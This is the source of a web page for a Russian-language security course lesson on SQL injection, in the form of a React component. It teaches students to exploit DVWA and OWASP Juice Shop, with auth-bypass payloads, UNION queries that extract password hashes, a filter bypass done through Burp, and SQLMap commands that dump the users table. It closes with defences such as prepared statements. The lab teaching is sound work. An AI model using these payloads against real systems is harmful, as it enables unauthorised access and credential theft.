
import { ContentPageLayout, P, H2, H3, Ul } from '@/components/content/ContentPageLayout';
import { CodeBlock } from '@/components/content/CodeBlock';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import Link from 'next/link';

const LinkStyle = "text-primary hover:text-primary/80 hover:underline";

export default function Module1Lesson4Page() {
  return (
    <ContentPageLayout
      title="Урок 4: SQL-инъекции – Практикум"
      subtitle="Модуль I: Основы безопасности веб-приложений"
    >
      <P>
        Добро пожаловать на четвертый урок, посвященный одной из самых критических уязвимостей веб-приложений – SQL-инъекциям (SQLi). Сегодня мы перейдем от теории к интенсивной практике, используя DVWA и OWASP Juice Shop для отработки навыков обнаружения и эксплуатации SQLi, а также познакомимся с основами автоматизации этого процесса с помощью SQLMap.
      </P>

      <H2>A. Цели урока</H2>
      <P>К концу этого урока вы сможете:</P>
      <Ul items={[
        "Понимать основные концепции SQL-инъекций и их потенциальное воздействие.",
        "Распознавать различные типы SQL-инъекций.",
        "Вручную эксплуатировать SQL-инъекции для обхода аутентификации и извлечения данных в DVWA на уровнях Low и Medium.",
        "Эксплуатировать SQL-инъекцию для получения несанкционированного доступа в OWASP Juice Shop.",
        "Использовать SQLMap для автоматического обнаружения и эксплуатации SQL-инъекций.",
        "Знать фундаментальные методы защиты от SQL-инъекций."
      ]} />

      <H2>B. Необходимые инструменты и подготовка</H2>
      <P>Перед началом убедитесь, что у вас настроены и запущены:</P>
      <Ul items={[
        <><strong>Damn Vulnerable Web Application (DVWA):</strong> Развернуто через Docker, как описано в Уроке 2. Убедитесь, что вы можете войти в систему (admin/password) и менять уровни безопасности.<sup>1</sup></>,
        <><strong>OWASP Juice Shop:</strong> Развернуто через Docker, как описано в Уроке 3. Убедитесь, что приложение доступно.<sup>4</sup></>,
        "<strong>Burp Suite Community Edition:</strong> Установлен и настроен для перехвата трафика браузера, как описано в Уроке 1.",
        <><strong>SQLMap:</strong> Установлен. SQLMap – это мощный инструмент для автоматизации SQL-инъекций.<sup>5</sup></>,
        "<strong>Веб-браузер:</strong> С настроенным прокси для Burp Suite."
      ]} />

      <H2>C. Краткий обзор SQL-инъекций (SQLi)</H2>
      <H3>Что такое SQLi и почему это опасно?</H3>
      <P>
        Язык структурированных запросов (SQL) используется для взаимодействия с базами данных. SQL-инъекция (SQLi) – это уязвимость, при которой злоумышленник может внедрить вредоносный SQL-код в запросы, отправляемые приложением к базе данных.<sup>8</sup> Это происходит, когда приложение некорректно обрабатывает пользовательский ввод и напрямую вставляет его в SQL-запросы.
      </P>
      <P>Последствия успешной SQLi-атаки могут быть разрушительными:<sup>8</sup></P>
      <Ul items={[
        "Обход аутентификации: Получение доступа к системе без валидных учетных данных.",
        "Несанкционированный доступ к данным: Чтение конфиденциальной информации (личные данные, финансовая информация, пароли).",
        "Модификация или удаление данных: Изменение или уничтожение важной информации в базе данных.",
        "Получение контроля над сервером: В некоторых случаях возможно выполнение команд на сервере базы данных и даже на операционной системе."
      ]} />

      <H3>Основные типы SQLi для практики</H3>
      <Ul items={[
        <><strong>In-band SQLi (Внутриканальные):</strong> Злоумышленник использует тот же канал для атаки и получения результатов.<sup>11</sup></>,
        <><strong>Error-based SQLi (На основе ошибок):</strong> Злоумышленник вызывает ошибки базы данных, которые раскрывают информацию о ее структуре или данных.<sup>11</sup></>,
        <><strong>UNION-based SQLi (На основе оператора UNION):</strong> Используется оператор UNION для объединения результатов легитимного запроса с результатами вредоносного запроса, позволяя извлечь данные из других таблиц.<sup>11</sup></>,
        <><strong>Inferential SQLi (Слепые/Умозрительные):</strong> Приложение не возвращает данные напрямую. Злоумышленник делает выводы, наблюдая за поведением приложения (изменения на странице, время ответа).<sup>11</sup>
          <Ul items={[
            "Boolean-based Blind SQLi: Запросы формируются так, чтобы ответ приложения менялся в зависимости от истинности или ложности внедренного условия.",
            "Time-based Blind SQLi: Внедряются команды, заставляющие базу данных ожидать определенное время, если условие истинно. Время ответа сервера указывает на результат."
          ]} />
        </>
      ]} />

      <H2>D. Практическое задание №1: Ручная эксплуатация SQLi в DVWA (Уровень Low)</H2>
      <P><strong>Цель:</strong> Научиться обходить аутентификацию и извлекать данные с помощью базовых SQL-инъекций на низком уровне безопасности DVWA.</P>
      <P><strong>Подготовка:</strong></P>
      <Ul items={[
        "Войдите в DVWA (admin/password).",
        "Перейдите в раздел \"DVWA Security\" и установите уровень безопасности на \"Low\". Нажмите \"Submit\".",
        "Перейдите на страницу \"SQL Injection\"."
      ]} />
      <H3>Задача 1.1: Обход аутентификации (теоретический пример на основе DVWA)</H3>
      <P>Хотя страница SQL Injection в DVWA напрямую не является формой входа, принцип обхода аутентификации важен. Представьте, что запрос для проверки логина и пароля выглядит так:</P>
      <CodeBlock code="SELECT * FROM users WHERE username = 'введенное_имя' AND password = 'введенный_пароль';" />
      <P>Если бы поле "User ID" на странице SQL Injection было полем имени пользователя, вы могли бы попробовать:</P>
      <P><strong>Полезная нагрузка:</strong> <code className="font-mono text-sm bg-muted p-1 rounded">admin'--</code></P>
      <P><strong>Результат:</strong> Запрос превратился бы в <code className="font-mono text-sm bg-muted p-1 rounded">SELECT * FROM users WHERE username = 'admin'--' AND password = '...'</code>. Часть запроса после -- (комментарий SQL) игнорируется, позволяя войти как 'admin' без пароля.<sup>17</sup></P>
      <P><strong>Полезная нагрузка:</strong> <code className="font-mono text-sm bg-muted p-1 rounded">' OR '1'='1</code></P>
      <P><strong>Результат:</strong> Запрос мог бы стать <code className="font-mono text-sm bg-muted p-1 rounded">SELECT * FROM users WHERE username = '' OR '1'='1--' AND password = '...'</code>. Условие 1=1 всегда истинно, что может позволить обойти проверку.<sup>15</sup></P>

      <H3>Задача 1.2: Извлечение данных с помощью UNION-based SQLi</H3>
      <P>На странице "SQL Injection" в DVWA (Low) есть поле "User ID". Когда вы вводите ID, приложение выполняет примерно такой запрос:</P>
      <CodeBlock code="SELECT first_name, last_name FROM users WHERE user_id = 'ВАШ_ВВОД';" />
      <P><strong>Шаги:</strong></P>
      <Ul items={[
        "Проверка функциональности: Введите 1 в поле \"User ID\" и нажмите \"Submit\". Вы должны увидеть имя и фамилию пользователя с ID 1.",
        <>Определение количества столбцов: Чтобы использовать UNION SELECT, нам нужно знать, сколько столбцов возвращает исходный запрос. Используйте <code className="font-mono text-sm bg-muted p-1 rounded">ORDER BY N--</code> для этого.
          <Ul items={[
            "Введите: <code className=\"font-mono text-sm bg-muted p-1 rounded\">1' ORDER BY 1--</code> (должно сработать)",
            "Введите: <code className=\"font-mono text-sm bg-muted p-1 rounded\">1' ORDER BY 2--</code> (должно сработать, так как есть first_name и last_name)",
            "Введите: <code className=\"font-mono text-sm bg-muted p-1 rounded\">1' ORDER BY 3--</code> (должна появиться ошибка, так как третьего столбца нет). Это означает, что исходный запрос возвращает 2 столбца.<sup>16</sup>"
          ]} />
        </>,
        <>Извлечение данных из таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>: Теперь мы можем попытаться извлечь данные. Мы знаем, что в DVWA есть таблица <code className="font-mono text-sm bg-muted p-1 rounded">users</code> со столбцами <code className="font-mono text-sm bg-muted p-1 rounded">user</code> (имя пользователя) и <code className="font-mono text-sm bg-muted p-1 rounded">password</code> (хэш пароля).
          <P><strong>Полезная нагрузка:</strong> <code className="font-mono text-sm bg-muted p-1 rounded">1' UNION SELECT user, password FROM users--</code></P>
          <P>Введите эту полезную нагрузку в поле "User ID" и нажмите "Submit".</P>
          <P><strong>Ожидаемый результат:</strong> Вы должны увидеть список имен пользователей и их хешированных паролей из таблицы users, отображенных на странице.<sup>15</sup></P>
        </>,
        <>Объяснение:
          <Ul items={[
            "<code className=\"font-mono text-sm bg-muted p-1 rounded\">1'</code> : Закрывает кавычку для user_id и завершает легитимное условие.",
            "<code className=\"font-mono text-sm bg-muted p-1 rounded\">UNION SELECT user, password FROM users</code>: Добавляет результаты нашего запроса (имена пользователей и пароли) к результатам исходного запроса.",
            "<code className=\"font-mono text-sm bg-muted p-1 rounded\">--</code>: Комментирует оставшуюся часть исходного SQL-запроса, чтобы избежать синтаксических ошибок."
          ]} />
        </>,
        <>(Опционально) Извлечение другой информации: Попробуйте извлечь версию базы данных: <code className="font-mono text-sm bg-muted p-1 rounded">1' UNION SELECT @@version, NULL--</code>. <code className="font-mono text-sm bg-muted p-1 rounded">@@version</code> – переменная, часто содержащая версию СУБД (для MySQL).<sup>17</sup> NULL используется, так как нам нужно два столбца.</>
      ]} />
      <H3>Вопросы для размышления:</H3>
      <Ul items={[
        "Почему важно определить правильное количество столбцов перед использованием UNION SELECT?",
        "Какие еще данные вы могли бы попытаться извлечь из базы данных DVWA, зная структуру таблиц (можно посмотреть через phpMyAdmin, если доступен, или угадывать стандартные имена)?"
      ]} />

      <H2>E. Практическое задание №2: Ручная эксплуатация SQLi в DVWA (Уровень Medium)</H2>
      <P><strong>Цель:</strong> Понять, как базовые меры защиты на среднем уровне DVWA влияют на SQL-инъекции, и попытаться их обойти.</P>
      <P><strong>Подготовка:</strong></P>
      <Ul items={[
        "В DVWA перейдите в раздел \"DVWA Security\" и установите уровень безопасности на \"Medium\". Нажмите \"Submit\".",
        "Перейдите на страницу \"SQL Injection\"."
      ]} />
      <H3>Задача 2.1: Анализ защиты и обход фильтров</H3>
      <P>На среднем уровне DVWA для SQL-инъекций используется выпадающий список для выбора User ID, и запросы отправляются методом POST.<sup>20</sup> Также применяется функция <code className="font-mono text-sm bg-muted p-1 rounded">mysql_real_escape_string()</code> для экранирования спецсимволов.</P>
      <P><strong>Шаги:</strong></P>
      <Ul items={[
        <>Анализ исходного кода (View Source): На странице SQL Injection (Medium) нажмите кнопку "View Source". Обратите внимание на код обработки <code className="font-mono text-sm bg-muted p-1 rounded">$_POST['id']</code>. Вы увидите, что используется <code className="font-mono text-sm bg-muted p-1 rounded">mysql_real_escape_string()</code>. Эта функция экранирует специальные символы, такие как одинарная кавычка ('). Также заметьте, что <code className="font-mono text-sm bg-muted p-1 rounded">id</code> используется в запросе без кавычек, так как ожидается числовое значение из выпадающего списка.
          <CodeBlock code={`$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;"`} />
        </>,
        "Попытка эксплуатации: Поскольку id используется как числовое значение и не обрамляется кавычками в SQL-запросе, экранирование кавычек функцией mysql_real_escape_string() не помешает нам, если мы не будем использовать кавычки в нашей полезной нагрузке.",
        <>Использование Burp Suite для модификации запроса:
          <Ul items={[
            "В Burp Suite перейдите на вкладку \"Proxy\" -> \"Intercept\". Включите перехват (\"Intercept is on\").",
            "На странице SQL Injection в DVWA выберите любой User ID из списка и нажмите \"Submit\".",
            "Запрос будет перехвачен в Burp Suite. Найдите параметр id в теле POST-запроса.",
            "Измените значение параметра id на следующую полезную нагрузку: <code className=\"font-mono text-sm bg-muted p-1 rounded\">1 UNION SELECT user, password FROM users</code> (Обратите внимание: здесь нет кавычек вокруг 1 и нет комментария -- в конце, так как после числового параметра обычно ничего не следует в простом запросе <code className=\"font-mono text-sm bg-muted p-1 rounded\">WHERE user_id = $id;</code>).",
            "Нажмите \"Forward\" в Burp Suite, чтобы отправить измененный запрос."
          ]} />
        </>,
        "Ожидаемый результат: Вы должны увидеть список имен пользователей и их хешированных паролей, как и на уровне Low."
      ]} />
      <P><strong>Объяснение:</strong> Так как параметр id обрабатывается как число, и в SQL-запросе он не заключен в кавычки, <code className="font-mono text-sm bg-muted p-1 rounded">mysql_real_escape_string</code> не мешает инъекции, если мы не используем символы, которые эта функция экранирует (например, кавычки). Мы напрямую внедряем UNION SELECT после числового ID.</P>
      <H3>Вопросы для размышления:</H3>
      <Ul items={[
        "Почему mysql_real_escape_string() не предотвратила эту инъекцию?",
        "Какие еще полезные нагрузки могли бы сработать в данном числовом контексте?"
      ]} />

      <H2>F. Практическое задание №3: Эксплуатация SQLi в OWASP Juice Shop</H2>
      <P><strong>Цель:</strong> Использовать SQL-инъекцию для обхода аутентификации и входа под учетной записью администратора в OWASP Juice Shop.</P>
      <P><strong>Подготовка:</strong></P>
      <Ul items={[
        "Убедитесь, что OWASP Juice Shop запущен и доступен по адресу http://localhost:3000.",
        "Перейдите на страницу входа (/#/login)."
      ]} />
      <H3>Задача 3.1: Вход под учетной записью администратора</H3>
      <P>Это соответствует челленджу "Login Admin" (сложность ⭐⭐) в Juice Shop.<sup>4</sup></P>
      <P><strong>Шаги:</strong></P>
      <Ul items={[
        "Анализ формы входа: На странице входа есть поля \"Email\" и \"Password\".",
        <>Попытка SQL-инъекции для обхода аутентификации:
          <Ul items={[
            "В поле \"Email\" введите следующую полезную нагрузку: <code className=\"font-mono text-sm bg-muted p-1 rounded\">' or 1=1--</code>",
            "В поле \"Password\" введите любой текст (например, \"password\").",
            "Нажмите кнопку \"Log in\"."
          ]} />
        </>,
        "Ожидаемый результат: Вы должны успешно войти в систему под учетной записью администратора (admin@juice-sh.op). Juice Shop также уведомит вас о решении челленджа \"Login Admin\".<sup>18</sup>"
      ]} />
      <P><strong>Объяснение:</strong></P>
      <Ul items={[
        "<code className=\"font-mono text-sm bg-muted p-1 rounded\">'</code> : Закрывает предполагаемую кавычку вокруг значения email в SQL-запросе.",
        "<code className=\"font-mono text-sm bg-muted p-1 rounded\">or 1=1</code>: Добавляет условие, которое всегда истинно. Если исходный запрос выглядит примерно как <code className=\"font-mono text-sm bg-muted p-1 rounded\">SELECT * FROM Users WHERE email = 'ВАШ_EMAIL' AND password = 'ВАШ_ПАРОЛЬ'</code>, то с инъекцией он станет <code className=\"font-mono text-sm bg-muted p-1 rounded\">SELECT * FROM Users WHERE email = '' or 1=1--' AND password = '...'</code>. Условие <code className=\"font-mono text-sm bg-muted p-1 rounded\">email = '' or 1=1</code> будет истинным для всех строк, и СУБД, вероятно, вернет первую подходящую запись, которой часто оказывается администратор.",
        "<code className=\"font-mono text-sm bg-muted p-1 rounded\">--</code>: Комментирует оставшуюся часть SQL-запроса, включая проверку пароля."
      ]} />
      <H3>Вопросы для размышления:</H3>
      <Ul items={[
        "Почему эта полезная нагрузка сработала? Попробуйте представить, как мог бы выглядеть SQL-запрос на стороне сервера.",
        "Какие еще вариации этой полезной нагрузки вы могли бы попробовать? (например, используя # вместо -- для MySQL, или ' OR 'a'='a <sup>8</sup>)"
      ]} />

      <H2>G. Практическое задание №4: Автоматизация SQLi с помощью SQLMap</H2>
      <P><strong>Цель:</strong> Научиться использовать SQLMap для автоматического обнаружения и эксплуатации SQL-инъекций на примере DVWA.</P>
      <P><strong>Подготовка:</strong></P>
      <Ul items={[
        "Убедитесь, что DVWA запущено, уровень безопасности установлен на \"Low\".",
        "Откройте терминал или командную строку, где у вас установлен SQLMap."
      ]} />
      <H3>Задача 4.1: Сканирование DVWA (Low) с помощью SQLMap</H3>
      <P><strong>Шаги:</strong></P>
      <Ul items={[
        <>Получение URL и Cookie:
          <Ul items={[
            "В браузере перейдите на страницу \"SQL Injection\" в DVWA (Low).",
            "Скопируйте полный URL из адресной строки. Он должен выглядеть примерно так: <code className=\"font-mono text-sm bg-muted p-1 rounded\">http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#</code> (замените localhost на ваш IP/домен DVWA, если необходимо).",
            "Откройте инструменты разработчика в браузере (обычно F12), перейдите на вкладку \"Application\" (или \"Storage\"), найдите Cookies для вашего сайта DVWA. Нам нужен PHPSESSID и значение cookie security (которое должно быть low).",
            "Пример cookie: <code className=\"font-mono text-sm bg-muted p-1 rounded\">PHPSESSID=ваша_длинная_строка_сессии; security=low</code>."
          ]} />
        </>,
        <>Запуск SQLMap для обнаружения уязвимости: В терминале выполните следующую команду, подставив ваш URL и cookie:
          <CodeBlock language="bash" code={`sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" --batch`} />
          <Ul items={[
            "<strong>-u \"URL\":</strong> Указывает целевой URL.<sup>5</sup>",
            "<strong>--cookie=\"COOKIE_STRING\":</strong> Предоставляет cookie для аутентифицированной сессии.<sup>5</sup>",
            "<strong>--batch:</strong> Запускает SQLMap с настройками по умолчанию, не задавая вопросов."
          ]} />
        </>,
        "Ожидаемый результат: SQLMap проанализирует параметр id и сообщит, что он уязвим к SQL-инъекциям. Он также может определить тип СУБД (MySQL) и возможные типы инъекций.<sup>22</sup>"
      ]} />

      <H3>Задача 4.2: Извлечение данных из DVWA (Low) с помощью SQLMap</H3>
      <P><strong>Шаги:</strong></P>
      <Ul items={[
        <>Получение списка баз данных: Используйте команду:
          <CodeBlock language="bash" code={`sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" --dbs --batch`} />
          <P><strong>--dbs:</strong> Указывает SQLMap извлечь список доступных баз данных.<sup>6</sup></P>
          <P><strong>Ожидаемый результат:</strong> SQLMap выведет список баз данных, среди которых должна быть <code className="font-mono text-sm bg-muted p-1 rounded">dvwa</code>.</P>
        </>,
        <>Получение списка таблиц из базы данных <code className="font-mono text-sm bg-muted p-1 rounded">dvwa</code>: Используйте команду:
          <CodeBlock language="bash" code={`sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" -D dvwa --tables --batch`} />
          <P><strong>-D dvwa:</strong> Указывает целевую базу данных.</P>
          <P><strong>--tables:</strong> Указывает SQLMap извлечь список таблиц из указанной БД.<sup>6</sup></P>
          <P><strong>Ожидаемый результат:</strong> SQLMap выведет список таблиц в базе <code className="font-mono text-sm bg-muted p-1 rounded">dvwa</code>, включая <code className="font-mono text-sm bg-muted p-1 rounded">users</code> и <code className="font-mono text-sm bg-muted p-1 rounded">guestbook</code>.</P>
        </>,
        <>Получение столбцов из таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>: Используйте команду:
          <CodeBlock language="bash" code={`sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" -D dvwa -T users --columns --batch`} />
          <P><strong>-T users:</strong> Указывает целевую таблицу.</P>
          <P><strong>--columns:</strong> Указывает SQLMap извлечь имена столбцов из указанной таблицы.<sup>6</sup></P>
          <P><strong>Ожидаемый результат:</strong> SQLMap выведет столбцы таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code> (например, user_id, first_name, last_name, user, password).</P>
        </>,
        <>Извлечение (дамп) данных из таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>: Используйте команду:
          <CodeBlock language="bash" code={`sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ВАШ_PHPSESSID; security=low" -D dvwa -T users --dump --batch`} />
          <P><strong>--dump:</strong> Указывает SQLMap извлечь все данные из указанной таблицы.<sup>6</sup></P>
          <P><strong>Ожидаемый результат:</strong> SQLMap выведет содержимое таблицы <code className="font-mono text-sm bg-muted p-1 rounded">users</code>, включая имена пользователей и хеши их паролей. SQLMap может предложить сохранить хеши для последующего взлома.</P>
        </>
      ]} />
      <H3>Вопросы для размышления:</H3>
      <Ul items={[
        "Насколько быстрее SQLMap справился с извлечением данных по сравнению с ручным методом?",
        "Какие еще опции SQLMap вы могли бы исследовать (например, --current-db, --current-user, --os-shell – с осторожностью!)?"
      ]} />

      <H2>H. Основы защиты от SQLi</H2>
      <P>Хотя этот урок посвящен эксплуатации, важно понимать, как защищаться от SQL-инъекций.</P>
      <Ul items={[
        <><strong>Параметризованные запросы (Prepared Statements):</strong> Это наиболее надежный метод. Запрос сначала определяется с плейсхолдерами, а пользовательские данные передаются отдельно. СУБД обрабатывает данные именно как данные, а не как исполняемый код.<sup>10</sup>
          <P>Пример на PHP (MySQLi):<sup>24</sup></P>
          <CodeBlock language="php" code={`$stmt = $mysqli->prepare("SELECT * FROM users WHERE user = ?");\n$stmt->bind_param("s", $username); // "s" - строка\n$stmt->execute();`} />
        </>,
        "<strong>Валидация входных данных:</strong> Проверяйте все данные от пользователя на соответствие ожидаемому формату, типу, длине (используйте \"белые списки\").<sup>8</sup>",
        "<strong>Принцип наименьших привилегий:</strong> Учетная запись, используемая приложением для доступа к БД, должна иметь только минимально необходимые права.<sup>10</sup>",
        "<strong>Экранирование спецсимволов:</strong> Менее надежный метод, используется, если параметризованные запросы недоступны. Применяйте специфичные для СУБД функции экранирования.<sup>10</sup>",
        "<strong>Web Application Firewalls (WAF):</strong> Могут обнаруживать и блокировать известные SQLi-атаки, но не являются панацеей и могут быть обойдены.<sup>10</sup>"
      ]} />

      <H2>I. Заключение и дальнейшие шаги</H2>
      <P>Поздравляем с завершением практического урока по SQL-инъекциям! Вы получили ценный опыт ручной и автоматизированной эксплуатации этой распространенной уязвимости.</P>
      <P><strong>Ключевые выводы:</strong></P>
      <Ul items={[
        "SQL-инъекции остаются серьезной угрозой.",
        "Понимание различных техник эксплуатации критически важно для тестировщиков безопасности.",
        "Инструменты вроде SQLMap значительно ускоряют процесс, но ручное понимание остается фундаментальным.",
        "Применение надежных методов защиты, таких как параметризованные запросы, является обязательным для разработчиков."
      ]} />
      <P><strong>Дальнейшие шаги:</strong></P>
      <Ul items={[
        "Продолжайте практиковаться на DVWA (уровни High, Impossible для изучения кода защиты) и OWASP Juice Shop (там много других SQLi-челленджей разной сложности).<sup>4</sup>",
        "Изучите более продвинутые техники SQLi: слепые инъекции (Boolean-based, Time-based), Out-of-band SQLi.",
        "Глубже изучите возможности SQLMap и других инструментов.",
        "Исследуйте специфичные для различных СУБД (MySQL, PostgreSQL, SQL Server, Oracle) функции и синтаксис, которые могут быть использованы в SQLi.<sup>17</sup>"
      ]} />
      <P>Помните, что все полученные знания должны использоваться этично и только в разрешенных средах для тестирования и обучения.</P>

      <H2>Источники</H2>
      <P className="text-sm">
        1. Laboratory Exercise – Cyber Basics – Web Application Security: SQL Injection Lab, <Link href="https://www.uscyberrange.org/wp-content/uploads/2023/02/3_SQL-Injection-lab.pdf" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        2. kaakaww/dvwa-docker, <Link href="https://github.com/kaakaww/dvwa-docker" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        3. DVWA command injection (C) - DCC/FCUP, <Link href="https://www.dcc.fc.up.pt/~edrdo/aulas/qses/lectures/lab1/" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        4. OWASP Juice Shop, <Link href="https://owasp.org/www-project-juice-shop/" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        5. SQLmap: Uncovering and Exploiting SQL Injection Vulnerabilities - Evolve Security, <Link href="https://www.evolvesecurity.com/blog-posts/tools-of-the-trade-your-ally-in-uncovering-sql-injection-vulnerabilities" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        6. Tutorial- SQLmap First we start the web application (Damn Vulnerable Web App), <Link href="http://www.cs.toronto.edu/~arnold/427/16s/csc427_16s/tutorials/sqlmap/SQLMap%20Tutorial.pdf" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        7. Important SQLMap commands - Infosec, <Link href="https://www.infosecinstitute.com/resources/penetration-testing/important-sqlmap-commands/" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        8. SQL Injection - OWASP Foundation, <Link href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        9. SQL injection - PortSwigger, <Link href="https://portswigger.net/kb/issues/00100200_sql-injection" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        10. What is a SQL Injection Attack? - CrowdStrike.com, <Link href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/sql-injection-attack/" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        11. Threats Types of SQL Injection - Packetlabs, <Link href="https://www.packetlabs.net/posts/types-of-sql-injection/" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        12. Error-Based SQL Injection: Risks, Exploitation & Mitigation - Indusface, <Link href="https://www.indusface.com/learning/error-based-sql-injection/" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        13. SQL Injection: Examples, Real Life Attacks & 9 Defensive Measures | Radware, <Link href="https://www.radware.com/cyberpedia/application-security/sql-injection/" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        14. What is SQL Injection (SQLi) and How to Prevent Attacks - Acunetix, <Link href="https://www.acunetix.com/websitesecurity/sql-injection/" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        15. SQL injection UNION attacks | Web Security Academy - PortSwigger, <Link href="https://portswigger.net/web-security/sql-injection/union-attacks" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        16. SQL Injection Cheat Sheet - Invicti, <Link href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        17. OWASP Juice Shop - TryHackMe, <Link href="https://tryhackme.com/room/owaspjuiceshop" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        18. R-230616904_OWASP_JuiceShop_WebApp - Secure Ideas, <Link href="https://secureideas.com/hubfs/R-230616904_OWASP_JuiceShop_WebApp%20.pdf" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        19. DVWA/vulnerabilities/sqli/index.php at master - GitHub, <Link href="https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/sqli/index.php" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        20. Injection :: Pwning OWASP Juice Shop, <Link href="https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        21. Blind SQL Injections with SQLMap against the DVWA - YouTube, <Link href="https://www.youtube.com/watch?v=joZKlgR1J5A" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        22. SQL Injection - Manual - PHP, <Link href="https://www.php.net/manual/en/security.database.sql-injection.php" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        23. How to prevent SQL Injection Vulnerabilities: How Prepared Statements Work, <Link href="https://www.securityjourney.com/post/how-to-prevent-sql-injection-vulnerabilities-how-prepared-statements-work" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br />
        24. Pwning OWASP Juice Shop - Leanpub, <Link href="https://leanpub.com/juice-shop" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link><br/>
        25. Introduction - Pwning OWASP Juice Shop, <Link href="https://pwning.owasp-juice.shop/companion-guide/latest/introduction/README.html" target="_blank" rel="noopener noreferrer" className={LinkStyle}>ссылка</Link>
      </P>
    </ContentPageLayout>
  );
}
